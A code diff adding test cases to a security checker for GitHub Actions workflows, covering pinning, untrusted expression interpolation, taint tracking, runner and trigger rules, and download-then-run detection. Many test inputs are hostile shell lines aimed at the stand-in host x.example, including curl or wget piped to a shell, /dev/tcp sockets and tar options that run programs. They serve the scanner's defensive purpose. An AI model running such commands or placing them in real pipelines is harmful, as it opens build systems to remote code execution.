+    "r5: a docker action by tag is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"), 1, "runs.image"),
+    "r5: a docker action without an image is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n"), 1, "runs.image"),
+    "r5: a docker action by digest passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@" + R5_DIGEST + "\n"), 0, ""),
+    "r5: a node action whose main is missing is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n  main: index.js\n"), 1, "runs.main"),
+    "r5: a node action without a main is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n"), 1, "runs.main"),
+    "r5: a node action whose main escapes the action is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: ../out.js\n", "out.js": "x\n"}, 1, "runs.main"),
+    "r5: a node action with its main file passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: index.js\n", "act/index.js": "x\n"}, 0, ""),
+    "r5: another runs.using is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: shell\n"), 1, "runs.using"),
+    "r5: an action file without runs is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\n"), 1, "runs.using"),
+    "r5: a run that is a mapping is refused": (_r5_job(steps="    steps:\n      - run:\n          a: b\n"), None, 1, "`run:` must be a scalar"),
+    "r5: github.event in run is refused": (_r5_run("echo ${{ github.event.pull_request.title }}"), None, 1, "interpolates"),
+    "r5: github.head_ref in run is refused": (_r5_run("echo ${{ github.head_ref }}"), None, 1, "interpolates"),
+    "r5: github.ref_name in run is refused": (_r5_run("echo ${{ github.ref_name }}"), None, 1, "interpolates"),
+    "r5: inputs in run is refused": (_r5_run("echo ${{ inputs.tag }}"), None, 1, "interpolates"),
+    "r5: a bracketed github event in run is refused": (_r5_run("echo ${{ github['event'].x }}"), None, 1, "interpolates"),
+    "r5: github.sha in run is refused": (_r5_run("echo ${{ github.sha }}"), None, 1, "interpolates"),
+    "r6: matrix and secrets expressions in run pass": (
+        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
+                steps="    steps:\n      - run: echo ${{ matrix.os }} ${{ secrets.TOKEN }}\n"), None, 0, ""),
+    "r5: an untrusted expression in env passes": (
+        _r5_job(steps="    steps:\n      - env:\n          T: ${{ github.event.pull_request.title }}\n        run: echo \"$T\"\n"), None, 0, ""),
+    "r6: a matrix key outside the job matrix is refused": (_r5_run("echo ${{ matrix.zz }}"), None, 1, "interpolates"),
+    "r6: a secrets path with extra segments is refused": (_r5_run("echo ${{ secrets.A.B }}"), None, 1, "interpolates"),
+    "r6: a function call in run is refused": (_r5_run("echo ${{ toJSON(secrets.A) }}"), None, 1, "interpolates"),
+    "r6: the output of a safe run step passes": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 0, ""),
+    "r6: the output of a step with an unlisted root is tainted": (
+        _r5_job(steps="    steps:\n      - id: x\n        env:\n          T: ${{ github.event.title }}\n"
+                      "        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r6: taint spreads through a step that reads a tainted output": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=$GITHUB_REF_NAME\" >> \"$GITHUB_OUTPUT\"\n"
+                      "      - id: z\n        env:\n          V: ${{ steps.x.outputs.y }}\n        run: echo \"w=$V\" >> \"$GITHUB_OUTPUT\"\n"
+                      "      - run: echo ${{ steps.z.outputs.w }}\n"), None, 1, "interpolates"),
+    "r6: the output of an unknown step is refused": (_r5_run("echo ${{ steps.nope.outputs.y }}"), None, 1, "interpolates"),
+    "r6: the output of a step id with extra segments is refused": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.outputs.y.z }}\n"), None, 1, "interpolates"),
+    "r6: the output of a sha-pinned use is refused in run text (Round 8, S3, vote 6def5ab6 option B)": (
+        _r5_job(steps="    steps:\n      - id: c\n        uses: " + CHECKOUT_USES + "\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 1, "`uses:` step"),
+    "r6: the output of a tag-pinned use is refused": (
+        _r5_job(steps="    steps:\n      - id: c\n        uses: actions/checkout@v4\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 2, "interpolates"),
+    "r6: a fetch step that runs a downloaded file is refused": (_r5_run("curl -fsSL -o f https://x.example/f && ./f"), None, 1, "fetch step"),
+    "r6: git clone then running the clone is refused": (_r5_run("git clone https://x.example/r.git x && ./x/run"), None, 1, "fetch step"),
+    "r6: a fetch step with only fetch commands passes": (
+        _r5_run("set -euo pipefail\n          curl -fsSL -o f.tgz https://x.example/f.tgz\n          echo \"abc  f.tgz\" | sha256sum -c -\n"
+                "          mkdir -p out\n          tar xzf f.tgz -C out --strip-components=1"), None, 0, ""),
+    "r6: a tar option that runs a program in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar --to-command=sh -xf f.tgz"), None, 1, "fetch step"),
+    "r6: a tar compress program in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f.tgz https://x.example/f.tgz\n          tar -I sh -xf f.tgz"), None, 1, "fetch step"),
+    "r6: a here-document in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f https://x.example/f\n          echo <<EOF\n          hi\n          EOF"), None, 1, "fetch step"),
+    "r6: a quoted fetch command is refused": (_r5_run("curl -fsSL -o f https://x.example/f\n          \"echo\" hi"), None, 1, "fetch step"),
+    "r6: an operator in a secrets expression is refused": (_r5_run("echo ${{ secrets.A || 'x' }}"), None, 1, "interpolates"),
+    "r6: a matrix path with extra segments is refused": (
+        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
+                steps="    steps:\n      - run: echo ${{ matrix.os.x }}\n"), None, 1, "interpolates"),
+    "r6: a steps path that is not outputs is refused": (
+        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.env.y }}\n"), None, 1, "interpolates"),
+    "r6: a PATH assignment in a fetch step is refused": (_r5_run("PATH=/x:$PATH curl -fsSL -o f https://x.example/f"), None, 1, "fetch step"),
+    "r6: a GITHUB_ENV write in a fetch step is refused": (
+        _r5_run("curl -fsSL -o f https://x.example/f\n          echo X=1 >> \"$GITHUB_ENV\""), None, 1, "fetch step"),
+    "r6: a fetch step the scanner cannot read is refused": (_r5_run("curl -fsSL -o f \"https://x.example/f"), None, 1, "cannot read"),
+    "r6: a step without a fetch word runs only the listed commands (Round 8, S8)": (_r5_run("python3 build.py\n          bash run-it"), None, 0, ""),
+    "r6: a fetch word in a comment does not make a fetch step": (_r5_run("# curl is not used here\n          python3 build.py"), None, 0, ""),
+    "r6: a hosted label passes": (_r5_job(head="    runs-on: ubuntu-24.04\n"), None, 0, ""),
+    "r6: a self-hosted runner is refused": (_r5_job(head="    runs-on: self-hosted\n"), None, 1, "runs-on"),
+    "r6: a runs-on expression is refused": (_r5_job(head="    runs-on: ${{ inputs.runner }}\n"), None, 1, "runs-on"),
+    "r6: a runs-on list is refused": (_r5_job(head="    runs-on: [ubuntu-latest]\n"), None, 1, "runs-on"),
+    "r6: a runs-on mapping is refused": (_r5_job(head="    runs-on:\n      group: big\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os of a hosted matrix passes": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n"), None, 0, ""),
+    "r6: runs-on matrix.os of a matrix with a self-hosted label is refused": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os without a matrix is refused": (_r5_job(head="    runs-on: ${{ matrix.os }}\n"), None, 1, "runs-on"),
+    "r6: runs-on matrix.os of include entries passes": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: macos-15-intel\n"),
+        None, 0, ""),
+    "r6: runs-on matrix.os of an include entry with a self-hosted label is refused": (
+        _r5_job(head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n          - os: self-hosted\n"),
+        None, 1, "runs-on"),
+    "r6: a workflow_call trigger is refused": ("on:\n  workflow_call:\n" + _r5_job(), None, 1, "workflow_call"),
+    "r6: a pull_request_target trigger is refused": ("on:\n  pull_request_target:\n" + _r5_job(), None, 1, "pull_request_target"),
+    "r6: a repository_dispatch trigger is refused": ("on:\n  repository_dispatch:\n" + _r5_job(), None, 1, "repository_dispatch"),
+    "r6: a forbidden trigger in a list is refused": ("on: [push, workflow_call]\n" + _r5_job(), None, 1, "workflow_call"),
+    "r6: a forbidden trigger in a block list is refused": ("on:\n  - push\n  - repository_dispatch\n" + _r5_job(), None, 1, "repository_dispatch"),
+    "r6: a push trigger passes": ("on:\n  push:\n" + _r5_job(), None, 0, ""),
+    "r6: a local action reached twice is walked once": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL),
+        _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
+    "r5: curl piped to sh is refused": (_r5_run("curl -fsSL https://x.example/i.sh | sh"), None, 1, "fetch step"),
+    "r5: wget piped to sudo bash is refused": (_r5_run("wget -qO- https://x.example/i.sh | sudo bash"), None, 1, "fetch step"),
+    "r5: curl piped to python is refused": (_r5_run("curl -fsSL https://x.example/i.py | python3"), None, 1, "fetch step"),
+    "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "fetch step"),
+    "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "fetch step"),
+    "r5: a curl into a variable is refused (Round 8, S1: a download in a substitution has no name to check)": (
+        _r5_run("x=$(curl -fsSL https://x.example/i)"), None, 1, "command substitution"),
+    "r5: a curl piped to sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
+    "r5: a container by tag is refused": (_r5_job(head="    container: rust:latest\n"), None, 1, "`container` image"),
+    "r5: a container by digest passes": (_r5_job(head="    container: rust@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: a container mapping by tag is refused": (_r5_job(head="    container:\n      image: rust:latest\n"), None, 1, "`container` image"),
+    "r5: a container mapping without an image is refused": (_r5_job(head="    container:\n      options: --user root\n"), None, 1, "`container` image"),
+    "r5: a container mapping by digest passes": (_r5_job(head="    container:\n      image: rust@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: services that are not a mapping are refused": (_r5_job(head="    services: pg\n"), None, 1, "`services` must be"),
+    "r5: a service by tag is refused": (_r5_job(head="    services:\n      pg:\n        image: postgres:16\n"), None, 1, "services.pg.image"),
+    "r5: a service without an image is refused": (_r5_job(head="    services:\n      pg:\n        ports: [5432]\n"), None, 1, "services.pg.image"),
+    "r5: a service by digest passes": (_r5_job(head="    services:\n      pg:\n        image: postgres@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: jobs that are a scalar are refused": ("jobs: x\n", None, 1, "`jobs:` must be a non-empty mapping"),
+    "r5: jobs that are empty are refused": ("jobs:\n", None, 1, "`jobs:` must be a non-empty mapping"),
+    "r5: a job that is a scalar is refused": ("jobs:\n  a: x\n", None, 1, "a job must be a mapping"),
+    "r5: needs as a mapping is refused": (_r5_job(head="    needs:\n      x: y\n"), None, 1, "`needs` must be"),
+    "r5: needs as a list holding a mapping is refused": (_r5_job(head="    needs:\n      - a:\n          b: c\n"), None, 1, "`needs` must be"),
+    "r5: needs as a string or a list of strings passes": (
+        "jobs:\n  b:\n    needs: a\n    steps:\n" + R5_OK_RUN + "  c:\n    needs: [a, b]\n    steps:\n" + R5_OK_RUN + "  a:\n    steps:\n" + R5_OK_RUN, None, 0, ""),
+    "r5: steps as a string are refused": (_r5_job(steps="    steps: do-it\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: steps as a mapping are refused": (_r5_job(steps="    steps:\n      a: b\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: steps with no value are refused": (_r5_job(steps="    steps:\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: a job with no steps is refused": (_r5_job(steps="    timeout-minutes: 5\n"), None, 1, "`steps` must be a non-empty list"),
+    "r5: a step that is a scalar is refused": (_r5_job(steps="    steps:\n      - just\n"), None, 1, "a step must be a mapping"),
+    "r5: a reusable workflow job needs no steps": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@" + "ab" * 20 + "\n", None, 0, ""),
+}
+
+
+R7_FETCH = "curl -fsSL -o f https://x.example/f"
+R7_VERIFY = 'echo "${SUM}  f" | sha256sum -c -'
+
+
+def _r7(*lines: str) -> str:
+    """A one-step job whose run text is the given lines."""
+    return _r5_run("\n          ".join(lines))
+
+
+def _r7_steps(*blocks: str, head: str = "") -> str:
+    """A job from whole step blocks (each a `      - ...` text ending in a newline)."""
+    return _r5_job(head=head, steps="    steps:\n" + "".join(blocks))
+
+
+R7_DIRTY_ENV = "        env:\n          T: ${{ github.event.pull_request.title }}\n"
+
+R7_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    # --- N1: commands inside an arithmetic expansion are scanned.
+    "r7 N1: a command substitution inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( $(sh f) ))"), None, 1, "fetch step"),
+    "r7 N1: a backtick command inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( `sh f` ))"), None, 1, "fetch step"),
+    "r7 N1: a subshell written as $((cmd) ) of a fetch step is refused": (_r7(R7_FETCH, "$((sh f) )"), None, 1, "fetch step"),
+    "r7 N1: a function definition in a fetch step is scanned": (_r7("f() { sh f; }", R7_FETCH), None, 1, "fetch step"),
+    "r7 N1: a function definition holding a plain command passes": (_r7(R7_FETCH, "f() { echo hi; }"), None, 0, ""),
+    "r7 F3: a curl piped to tar with no checksum check is refused (it passed in round 6)": (
+        _r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 1, "before a checksum check"),
+    "r7 N1: plain arithmetic in a fetch step passes the scan": (_r7(R7_FETCH, "echo $(( 1 + 2 ))"), None, 0, ""),
+    # --- N2: a braced GITHUB_ENV / GITHUB_PATH write is a write.
+    "r7 N2: a braced GITHUB_ENV write in a fetch step is refused": (_r7(R7_FETCH, 'echo "X=1" >> "${GITHUB_ENV}"'), None, 1, "fetch step"),
+    "r7 N2: a braced GITHUB_PATH write in a fetch step is refused": (_r7(R7_FETCH, 'echo "$PWD" >> ${GITHUB_PATH}'), None, 1, "fetch step"),
+    # --- N3: wget options are an allow-list.
+    "r7 N6: a local action that is a symlink loop is refused, not raised": (
+        _r7_steps("      - uses: ./loop\n"), {"loop": "\0symlink:loop"}, 1, "local action"),
+    "r7 N2: a fetched file copied over GITHUB_ENV after the checksum check is refused": (
+        _r7(R7_FETCH, R7_VERIFY, 'cp f "$GITHUB_ENV"'), None, 1, "GITHUB_ENV"),
+    "r7 F3: tar with a short option that runs a program is refused after the checksum check": (
+        _r7(R7_FETCH, R7_VERIFY, "tar -I sh -xf f"), None, 1, "tar option"),
+    "r7 F3: tar with a long option that runs a program is refused after the checksum check": (
+        _r7(R7_FETCH, R7_VERIFY, "tar -xf f --to-command=sh"), None, 1, "tar option"),
+    "r7 F5: an exec descriptor opened on a split /dev/tcp path is refused": (
+        _r7('exec 3<>"/dev/t""cp/x.example/80"'), None, 1, "network connection"),
+    "r7 F5: python -c without a network word is refused by the run allow-list (Round 8, S8)": (
+        _r7("python3 -c 'import os; os.system(\"true\")'"), None, 1, "not a script file"),
+    "r7 N3: wget --use-askpass in a fetch step is refused": (_r7("wget --use-askpass=./x -O f https://x.example/f"), None, 1, "wget"),
+    "r7 N3: wget -e use_askpass in a fetch step is refused": (_r7("wget -e use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
+    "r7 N3: wget --execute in a fetch step is refused": (_r7("wget --execute=use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
+    "r7 N3: a plain wget -q -O passes the option check": (_r7("wget -q -O f https://x.example/f", R7_VERIFY), None, 0, ""),
+    # --- N4 / F4: the shell of a step, a job and a workflow.
+    "r7 N4: a step shell of pwsh is refused": (_r7_steps("      - run: echo ok\n        shell: pwsh\n"), None, 1, "`shell: pwsh`"),
+    "r7 N4: a step shell of python is refused": (_r7_steps("      - run: echo ok\n        shell: python\n"), None, 1, "`shell: python`"),
+    "r7 N4: a step shell with a custom template is refused": (_r7_steps("      - run: echo ok\n        shell: bash {0}\n"), None, 1, "not allowed"),
+    "r7 N4: a step shell of bash passes": (_r7_steps("      - run: echo ok\n        shell: bash\n"), None, 0, ""),
+    "r7 N4: a job defaults.run.shell of pwsh is refused": (_r7_steps(R5_OK_RUN, head="    defaults:\n      run:\n        shell: pwsh\n"), None, 1, "defaults.run.shell"),
+    "r7 N4: a workflow defaults.run.shell of pwsh is refused": ("defaults:\n  run:\n    shell: pwsh\n" + _r5_job(), None, 1, "defaults.run.shell"),
+    "r7 F4: a run on a Windows runner with no shell is refused": (_r7_steps(R5_OK_RUN, head="    runs-on: windows-latest\n"), None, 1, "no `shell:`"),
+    "r7 F4: a run on a Windows runner with shell bash passes": (_r7_steps("      - run: echo ok\n        shell: bash\n", head="    runs-on: windows-latest\n"), None, 0, ""),
+    # --- N5 / F1: taint through job env, workflow env, set-output, GITHUB_ENV, files and `with:`.
+    "r7 N5: a job env value feeding a GITHUB_OUTPUT writer taints it": (
+        _r7_steps("      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n",
+                  head="    env:\n      T: ${{ github.event.pull_request.title }}\n"), None, 1, "interpolates"),
+    "r7 F1: a workflow env value feeding a GITHUB_OUTPUT writer taints it": (
+        "env:\n  T: ${{ github.event.pull_request.title }}\n" + _r7_steps(
+            "      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r7 N5: a value relayed through GITHUB_ENV taints a later writer": (
+        _r7_steps("      - run: echo \"V=$T\" >> \"$GITHUB_ENV\"\n" + R7_DIRTY_ENV,
+                  "      - id: x\n        run: echo \"y=$V\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r7 F1: a legacy ::set-output writer with an untrusted env is tainted": (
+        _r7_steps("      - id: x\n        run: echo \"::set-output name=y::$T\"\n" + R7_DIRTY_ENV, "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r7 F1: a value relayed through a file taints a later writer": (
+        _r7_steps("      - run: echo \"$T\" > val.txt\n" + R7_DIRTY_ENV,
+                  "      - id: x\n        run: echo \"y=$(cat val.txt)\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r7 F1: a uses step with an untrusted with value has tainted outputs": (
+        _r7_steps("      - id: u\n        uses: " + CHECKOUT_USES + "\n        with:\n          ref: ${{ github.event.pull_request.head.ref }}\n",
+                  "      - run: echo ${{ steps.u.outputs.ref }}\n"), None, 1, "interpolates"),
+    "r7 F1: a uses step with a literal with value is still refused in run text (Round 8, S3)": (
+        _r7_steps("      - id: u\n        uses: " + CHECKOUT_USES + "\n        with:\n          ref: main\n", "      - run: echo ${{ steps.u.outputs.ref }}\n"), None, 1, "`uses:` step"),
+    # --- F2: a matrix value of any job but release.yml's release job is a literal.
+    "r7 F2: an expression matrix value in a job is refused": (
+        _r7_steps("      - run: echo ${{ matrix.os }}\n", head="    strategy:\n      matrix:\n        os: ${{ fromJSON(github.event.pull_request.title) }}\n"), None, 1, "strategy.matrix"),
+    "r7 F2: an expression inside a matrix list is refused": (
+        _r7_steps("      - run: echo ${{ matrix.os }}\n", head="    strategy:\n      matrix:\n        os: [\"${{ github.head_ref }}\"]\n"), None, 1, "strategy.matrix"),
+    # --- F3: a downloaded file is checked before it is unpacked, moved or run.
+    "r7 F3: a tar of a download with no checksum is refused": (_r7(R7_FETCH, "tar xzf f"), None, 1, "checksum"),
+    "r7 F3: a curl piped to tar with no checksum is refused": (_r7("curl -fsSL https://x.example/f | tar xz"), None, 1, "tar"),
+    "r7 F3: a tar after a checksum check passes": (_r7(R7_FETCH, R7_VERIFY, "tar xzf f"), None, 0, ""),
+    "r7 F3: a checksum check inside an if does not count": (_r7(R7_FETCH, "if " + R7_VERIFY.split(" | ")[0] + " | sha256sum -c -; then :; fi", "tar xzf f"), None, 1, "checksum"),
+    "r7 F3: a checksum check ended by || true does not count": (_r7(R7_FETCH, R7_VERIFY + " || true", "tar xzf f"), None, 1, "checksum"),
+    "r7 F3: set +e in a fetch step is refused": (_r7("set +e", R7_FETCH, R7_VERIFY, "tar xzf f"), None, 1, "fetch step"),
+    "r7 F3: a download written over a command name is refused": (_r7("curl -fsSL -o sha256sum https://x.example/f", R7_VERIFY), None, 1, "command name"),
+    "r7 F3: a download written to the system bin directory is refused": (_r7("curl -fsSL -o /usr/local/bin/tool https://x.example/f"), None, 1, "bin directory"),
+    "r7 F3: a later step that runs a downloaded file with no checksum is refused": (
+        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: chmod +x f && bash f\n"), None, 1, "downloaded"),
+    "r7 F3: a later step with a word that merely starts with the file name passes": (
+        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: echo foo\n"), None, 0, ""),
+    "r7 F3: a later step that checks the downloaded file passes": (
+        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: |\n          " + R7_VERIFY + "\n          tar xzf f\n"), None, 0, ""),
+    # --- F5: a download that no fetch word names.
+    "r7 F5: a /dev/tcp redirect is refused": (_r7("exec 3<>/dev/tcp/x.example/80", "echo ok"), None, 1, "/dev/tcp"),
+    "r7 F5: a /dev/tcp read is refused": (_r7("cat < /dev/tcp/x.example/80 > f"), None, 1, "/dev/tcp"),
+    "r7 F5: python urllib in -c is refused": (_r7("python3 -c 'import urllib.request as u; u.urlretrieve(\"https://x.example/f\", \"f\")'", "sh f"), None, 1, "fetch step"),
+    "r7 F5: python -m urllib.request is refused": (_r7("python3 -m urllib.request https://x.example/f", "sh f"), None, 1, "fetch step"),
+    "r7 F5: gh release download then a run is refused": (_r7("gh release download v1 -p f", "sh f"), None, 1, "allow-list"),
+    "r7 F5: docker run of a tag-only image is refused": (_r7("docker run --rm alpine:3 sh -c ls"), None, 1, "allow-list"),
+    "r7 F5: docker pull is refused": (_r7("docker pull alpine:3"), None, 1, "allow-list"),
+    "r7 F5: docker run of a digest-pinned image passes": (_r7("docker run --rm alpine@" + R5_DIGEST + " ls"), None, 0, ""),
+    "r7 F5: gh attestation verify is not a fetch": (_r7("gh attestation verify f --repo o/r", "bash f"), None, 0, ""),
+    # --- N6: depth counts on the resolved path; a walked action is still depth-checked; a loop is refused.
+    "r7 N6: a deep chain reached after a shallow visit is still refused": (
+        _r5_job(steps="    steps:\n      - uses: ./n2\n      - uses: ./n0\n"), {**{"n%d/action.yml" % k: _r5_comp(("    - uses: ./n%d\n" % (k + 1)) if k < 9 else "    - run: echo ok\n      shell: bash\n") for k in range(10)}}, 1, "nests more than"),
+    "r7 N6: the same shallow action used twice passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL), _r5_act(_r5_comp("    - run: echo ok\n      shell: bash\n")), 0, ""),
+    "r7 F3: a verify behind false && does not count": (_r7(R7_FETCH, "false && " + R7_VERIFY, "tar xzf f"), None, 1, "own checksum check"),
+    "r7 F3: a negated verify does not count": (_r7(R7_FETCH, "! " + R7_VERIFY, "tar xzf f"), None, 1, "own checksum check"),
+    "r7 F3: a verify inside a subshell does not count": (_r7(R7_FETCH, "(" + R7_VERIFY + ")", "tar xzf f"), None, 1, "own checksum check"),
+    "r7 F3: verify && tar passes": (_r7(R7_FETCH, R7_VERIFY + " && tar xzf f"), None, 0, ""),
+    "r7 F3: tar into the bin directory after a verify passes": (_r7(R7_FETCH, R7_VERIFY, "tar xzf f -C /usr/local/bin nfpm"), None, 0, ""),
+    "r7 F3: a URL that names a bin directory passes": (_r7("curl -fsSL -o f https://x.example/usr/bin/tool", R7_VERIFY), None, 0, ""),
+    "r7 F3: a redirect to a computed path in a fetch step is refused": (_r7(R7_FETCH, "echo x > $HOME/f"), None, 1, "computed path"),
+    "r7 F1: a relay through a script the scanner cannot read taints a later writer": (
+        _r7_steps("      - run: echo \"$T\" >> x; echo )\n" + R7_DIRTY_ENV,
+                  "      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 2, "interpolates"),
+    "r7 N5: a job env of allowed expressions keeps clean outputs": (
+        _r7_steps("      - id: x\n        run: echo \"y=$S\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n",
+                  head="    env:\n      S: ${{ secrets.TOKEN }}\n"), None, 0, ""),
+    "r7 F4: a Windows matrix leg with no shell is refused": (
+        _r7_steps(R5_OK_RUN, head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [windows-latest]\n"), None, 1, "no `shell:`"),
+    "r7 F4: a Windows job whose default shell is bash passes": (
+        _r7_steps(R5_OK_RUN, head="    runs-on: windows-latest\n    defaults:\n      run:\n        shell: bash\n"), None, 0, ""),
+    "r7 F5: docker run of a locally built image passes": (
+        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: true\n          tags: ai-memory-ci:verify\n",
+                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 0, ""),
+    "r7 F5: docker run of an image the build step did not load is refused": (
+        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: false\n          tags: ai-memory-ci:verify\n",
+                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 1, "allow-list"),
+}
+
+
+def r5_errors(doc_text: str, files: Optional[Dict[str, str]], tree: Path) -> List[str]:
+    """Run the Round-5 checks on one document (and, for ``files`` not None, a tree holding those files)."""
+    if tree.exists():
+        shutil.rmtree(tree)
+    tree.mkdir(parents=True)
+    for rel, text in (files or {}).items():
+        (tree / rel).parent.mkdir(parents=True, exist_ok=True)
+        if text.startswith("\0symlink:"):  # a symlink to the named path, resolved against the tree
+            (tree / rel).symlink_to(text[len("\0symlink:"):])
+        else:
+            (tree / rel).write_text(text, encoding="utf-8")
+    rep = Report()
+    rep.root = tree if files is not None else None
+    doc = parse_yaml(doc_text, "w.yml", rep)
+    if doc is not None:
+        check_uses_pinned(doc, "w.yml", rep)
+    return rep.errors
+
+
 def unit_checks() -> int:
     """Pure-function cases: logical_lines parity with BuildKit, noise detection, scalar decoding."""
     failures = 0
@@ -2198,6 +5527,646 @@ def unit_checks() -> int:
             print(f"self-test FAIL: scalar {doc!r} decoded {got!r}, wanted {want!r}", file=sys.stderr)
             failures += 1
     return failures
+
+
+def _r8(*lines: str) -> str:
+    return _r7(*lines)
+
+
+R8_TOOL = "      - run: curl -fsSL -o tool https://x.example/tool\n"
+R8_MATRIX = "    strategy:\n      matrix:\n        k: [%s]\n"
+
+# Round 8 (security S1-S9 and code C1-C6 of r7, vote 6def5ab6): (document, files, message count, needle).
+R8_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    # --- S5: a defaults or defaults.run that is not a mapping hides the shell.
+    "r8 S5: a scalar defaults.run is refused": (_r7_steps("      - run: echo ok\n", head="    defaults:\n      run: pwsh\n"), None, 1, "defaults.run"),
+    "r8 S5: a scalar defaults is refused": (_r7_steps("      - run: echo ok\n", head="    defaults: pwsh\n"), None, 1, "defaults.run"),
+    "r8 S5: a mapping defaults.run with bash passes": (_r7_steps("      - run: echo ok\n", head="    defaults:\n      run:\n        shell: bash\n"), None, 0, ""),
+    # --- S6: BASH_ENV and ENV through an env mapping, at the workflow, job and step level.
+    "r8 S6: a job env BASH_ENV is refused": (_r7_steps("      - run: echo ok\n", head="    env:\n      BASH_ENV: ./rc\n"), None, 1, "BASH_ENV"),
+    "r8 S6: a step env BASH_ENV is refused": (_r7_steps("      - run: echo ok\n        env:\n          BASH_ENV: ./rc\n"), None, 1, "BASH_ENV"),
+    "r8 S6: a workflow env ENV is refused": ("env:\n  ENV: ./rc\n" + _r7("echo ok"), None, 1, "`ENV`"),
+    "r8 S6: an env of an ordinary name passes": (_r7_steps("      - run: echo ok\n        env:\n          NAME: v\n"), None, 0, ""),
+    # --- S4: a literal matrix value that reaches run text is scanned like run text.
+    "r8 S4: a matrix value that runs a downloader is refused": (_r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "'x; pip install y'"), None, 1, "matrix value"),
+    "r8 S4: a matrix include value that runs a downloader is refused": (
+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head="    strategy:\n      matrix:\n        include:\n          - k: 'x; pip install y'\n"), None, 1, "matrix value"),
